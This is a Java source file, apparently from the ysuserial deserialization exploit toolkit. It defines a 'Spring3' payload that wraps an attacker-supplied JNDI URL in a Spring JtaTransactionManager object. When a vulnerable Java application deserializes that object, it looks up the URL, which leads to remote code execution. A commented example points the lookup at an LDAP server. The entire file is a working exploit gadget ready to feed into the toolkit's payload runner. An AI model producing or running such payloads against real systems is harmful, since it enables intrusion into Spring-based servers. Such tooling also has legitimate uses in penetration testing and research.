package org.su18.ysuserial.payloads;

import org.springframework.transaction.jta.JtaTransactionManager;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.PayloadRunner;

@Dependencies({"org.springframework:spring-tx:5.2.3.RELEASE", "org.springframework:spring-context:5.2.3.RELEASE", "javax.transaction:javax.transaction-api:1.2"})
public class Spring3 extends PayloadRunner implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        String jndiURL = null;
        if (command.toLowerCase().startsWith("jndi:")) {
            jndiURL = command.substring(5);
        } else {
            throw new Exception(String.format("Command [%s] not supported", command));
        }

        JtaTransactionManager manager = new JtaTransactionManager();
        manager.setUserTransactionName(jndiURL);
        return manager;
    }

    public static void main(String[] args) throws Exception {
        //args = new String[]{"jndi:ldap://127.0.0.1:1664/obj"};
        PayloadRunner.run(Spring3.class, args);
    }
}
